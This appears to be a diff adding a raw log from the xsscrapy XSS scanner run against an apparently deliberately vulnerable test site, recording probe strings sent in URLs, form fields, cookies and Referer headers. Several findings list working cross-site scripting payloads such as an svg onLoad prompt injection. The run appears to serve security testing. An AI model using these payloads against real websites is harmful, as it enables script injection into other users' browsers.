@@ -1,0 +1,714 @@
+/usr/local/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography import utils, x509
+/usr/local/lib/python2.7/site-packages/BeautifulSoup.py:114: UserWarning: You are using a very old release of Beautiful Soup, last updated in 2011. If you installed the 'beautifulsoup' package through pip, you should know the 'beautifulsoup' package name is about to be reclaimed by a more recent version of Beautiful Soup which is incompatible with this version.
+
+This will happen at some point after January 1, 2021.
+
+If you just started this project, this is easy to fix. Install the 'beautifulsoup4' package instead of 'beautifulsoup' and start using Beautiful Soup 4.
+
+If this is an existing project that depends on Beautiful Soup 3, the project maintainer (potentially you) needs to start the process of migrating to Beautiful Soup 4. This should be a relatively easy part of the Python 3 migration.
+
+  """)
+2021-06-28 17:21:16 [scrapy] INFO: Scrapy 1.1.0rc3 started (bot: xsscrapy)
+2021-06-28 17:21:16 [scrapy] INFO: Overridden settings: {'NEWSPIDER_MODULE': 'xsscrapy.spiders', 'DUPEFILTER_CLASS': 'xsscrapy.bloomfilters.BloomURLDupeFilter', 'SPIDER_MODULES': ['xsscrapy.spiders'], 'CONCURRENT_REQUESTS': '30', 'BOT_NAME': 'xsscrapy', 'DOWNLOAD_DELAY': '0'}
+2021-06-28 17:21:16 [scrapy] INFO: Enabled extensions:
+['scrapy.extensions.logstats.LogStats',
+ 'scrapy.extensions.telnet.TelnetConsole',
+ 'scrapy.extensions.corestats.CoreStats']
+2021-06-28 17:21:16 [scrapy] INFO: Enabled downloader middlewares:
+['xsscrapy.middlewares.InjectedDupeFilter',
+ 'xsscrapy.middlewares.RandomUserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware',
+ 'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware',
+ 'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.retry.RetryMiddleware',
+ 'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware',
+ 'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.RedirectMiddleware',
+ 'scrapy.downloadermiddlewares.cookies.CookiesMiddleware',
+ 'scrapy.downloadermiddlewares.chunked.ChunkedTransferMiddleware',
+ 'scrapy.downloadermiddlewares.stats.DownloaderStats']
+2021-06-28 17:21:16 [scrapy] INFO: Enabled spider middlewares:
+['scrapy.spidermiddlewares.httperror.HttpErrorMiddleware',
+ 'scrapy.spidermiddlewares.offsite.OffsiteMiddleware',
+ 'scrapy.spidermiddlewares.referer.RefererMiddleware',
+ 'scrapy.spidermiddlewares.urllength.UrlLengthMiddleware',
+ 'scrapy.spidermiddlewares.depth.DepthMiddleware']
+2021-06-28 17:21:16 [scrapy] INFO: Enabled item pipelines:
+['xsscrapy.pipelines.XSSCharFinder']
+2021-06-28 17:21:16 [scrapy] INFO: Spider opened
+2021-06-28 17:21:16 [scrapy] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)
+2021-06-28 17:21:16 [scrapy] DEBUG: Telnet console listening on 127.0.0.1:6023
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php> (referer: None)
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/index.php/1zqjbg'%22()%7B%7D%3Cx%3E:1zqjbg;9
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:24 [scrapy] DEBUG: Filtered offsite request to 'github.com': <GET https://github.com/OttFH/xss-suite-test-site>
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php> (referer: 1zqjdv'"(){}<x>:/1zqjdv;9)
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php/1zqjby'%22()%7B%7D%3Cx%3E:1zqjby;9/?xss=234
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=1zqjay'%22()%7B%7D%3Cx%3E:/1zqjay;9
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php/1zqjbg'%22()%7B%7D%3Cx%3E:1zqjbg;9> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/index.php. type = header, Referer
+
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (404) <GET https://xss-suite-test-site.herokuapp.com/robots.txt> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php/1zqjjg'%22()%7B%7D%3Cx%3E:1zqjjg;9
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded form param xss to: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:24 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:24 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/index.php/1zqjbg'%22()%7B%7D%3Cx%3E:1zqjbg;9. type = url, end of url
+
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php/1zqjxf'%22()%7B%7D%3Cx%3E:1zqjxf;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=1zqjac'%22()%7B%7D%3Cx%3E:/1zqjac;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/index.php. type = header, cookie
+
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php/1zqjfk'%22()%7B%7D%3Cx%3E:1zqjfk;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=1zqjrn'%22()%7B%7D%3Cx%3E:/1zqjrn;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php/1zqjby'%22()%7B%7D%3Cx%3E:1zqjby;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php/1zqjfp'%22()%7B%7D%3Cx%3E:1zqjfp;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=1zqjxi'%22()%7B%7D%3Cx%3E:/1zqjxi;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404/1zqjlt'%22()%7B%7D%3Cx%3E:1zqjlt;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=1zqjay'%22()%7B%7D%3Cx%3E:/1zqjay;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234> (referer: 1zqjcb'"(){}<x>:/1zqjcb;9)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php/1zqjmg'%22()%7B%7D%3Cx%3E:1zqjmg;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=1zqjxn'%22()%7B%7D%3Cx%3E:/1zqjxn;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php/1zqjsf'%22()%7B%7D%3Cx%3E:1zqjsf;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=1zqjyn'%22()%7B%7D%3Cx%3E:/1zqjyn;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php/1zqjjg'%22()%7B%7D%3Cx%3E:1zqjjg;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <POST https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php> (referer: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php/1zqjoz'%22()%7B%7D%3Cx%3E:1zqjoz;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=1zqjoc'%22()%7B%7D%3Cx%3E:/1zqjoc;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php> (referer: 1zqjch'"(){}<x>:/1zqjch;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php> (referer: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php/1zqjqn'%22()%7B%7D%3Cx%3E:1zqjqn;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=1zqjrq'%22()%7B%7D%3Cx%3E:/1zqjrq;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php/1zqjxf'%22()%7B%7D%3Cx%3E:1zqjxf;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php/1zqjwg'%22()%7B%7D%3Cx%3E:1zqjwg;9/?xss=234
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php/1zqjby'%22()%7B%7D%3Cx%3E:1zqjby;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=1zqjac'%22()%7B%7D%3Cx%3E:/1zqjac;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=1zqjvt'%22()%7B%7D%3Cx%3E:/1zqjvt;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php/1zqjfk'%22()%7B%7D%3Cx%3E:1zqjfk;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234> (referer: 1zqjsm'"(){}<x>:/1zqjsm;9)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php/1zqjeb'%22()%7B%7D%3Cx%3E:1zqjeb;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=1zqjhy'%22()%7B%7D%3Cx%3E:/1zqjhy;9
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=1zqjay'%22()%7B%7D%3Cx%3E:/1zqjay;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php/1zqjjg'%22()%7B%7D%3Cx%3E:1zqjjg;9. type = url, end of url
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=1zqjrn'%22()%7B%7D%3Cx%3E:/1zqjrn;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php
+2021-06-28 17:21:25 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php
+2021-06-28 17:21:25 [xsscrapy] INFO:     POST url: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php
+2021-06-28 17:21:25 [xsscrapy] INFO:     Unfiltered: '"(){}<x>:/;
+2021-06-28 17:21:25 [xsscrapy] INFO:     Payload: 1zqjtp'"(){}<x>:/1zqjtp;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Type: form
+2021-06-28 17:21:25 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:25 [xsscrapy] INFO:     Possible payloads: <svG onLoad=prompt(9)>
+2021-06-28 17:21:25 [xsscrapy] INFO:     Line: <div>1zqjtp'"(){}<x>:/1zqjtp;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php>
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234> (referer: 1zqjlm'"(){}<x>:/1zqjlm;9)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php/1zqjfp'%22()%7B%7D%3Cx%3E:1zqjfp;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=1zqjxi'%22()%7B%7D%3Cx%3E:/1zqjxi;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php/1zqjdu'%22()%7B%7D%3Cx%3E:1zqjdu;9/?xss=234
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234> (referer: 1zqjjw'"(){}<x>:/1zqjjw;9)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php. type = header, cookie
+
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=1zqjtm'%22()%7B%7D%3Cx%3E:/1zqjtm;9
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php/1zqjxf'%22()%7B%7D%3Cx%3E:1zqjxf;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404/1zqjlt'%22()%7B%7D%3Cx%3E:1zqjlt;9> (referer: https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404> (referer: https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234
+2021-06-28 17:21:25 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=1zqjac'%22()%7B%7D%3Cx%3E:/1zqjac;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Unfiltered: '"(){}<x>:/;
+2021-06-28 17:21:25 [xsscrapy] INFO:     Payload: 1zqjac'"(){}<x>:/1zqjac;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Type: url
+2021-06-28 17:21:25 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:25 [xsscrapy] INFO:     Possible payloads: --><svG onLoad=prompt(9)>
+2021-06-28 17:21:25 [xsscrapy] INFO:     Line: <!-- 1zqjac'"(){}<x>:/1zqjac;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=1zqjac'%22()%7B%7D%3Cx%3E:/1zqjac;9>
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php/1zqjfk'%22()%7B%7D%3Cx%3E:1zqjfk;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404> (referer: 1zqjld'"(){}<x>:/1zqjld;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php/1zqjmg'%22()%7B%7D%3Cx%3E:1zqjmg;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=1zqjxn'%22()%7B%7D%3Cx%3E:/1zqjxn;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php/1zqjnb'%22()%7B%7D%3Cx%3E:1zqjnb;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=1zqjuh'%22()%7B%7D%3Cx%3E:/1zqjuh;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234> (referer: 1zqjzx'"(){}<x>:/1zqjzx;9)
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php/1zqjjk'%22()%7B%7D%3Cx%3E:1zqjjk;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234
+2021-06-28 17:21:25 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=1zqjrn'%22()%7B%7D%3Cx%3E:/1zqjrn;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Unfiltered: '"(){}<x>:/;
+2021-06-28 17:21:25 [xsscrapy] INFO:     Payload: 1zqjrn'"(){}<x>:/1zqjrn;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Type: url
+2021-06-28 17:21:25 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:25 [xsscrapy] INFO:     Possible payloads: <svG onLoad=prompt(9)>
+2021-06-28 17:21:25 [xsscrapy] INFO:     Line: <div>1zqjrn'"(){}<x>:/1zqjrn;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=1zqjrn'%22()%7B%7D%3Cx%3E:/1zqjrn;9>
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php/1zqjsf'%22()%7B%7D%3Cx%3E:1zqjsf;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=1zqjyn'%22()%7B%7D%3Cx%3E:/1zqjyn;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234. type = header, Referer
+
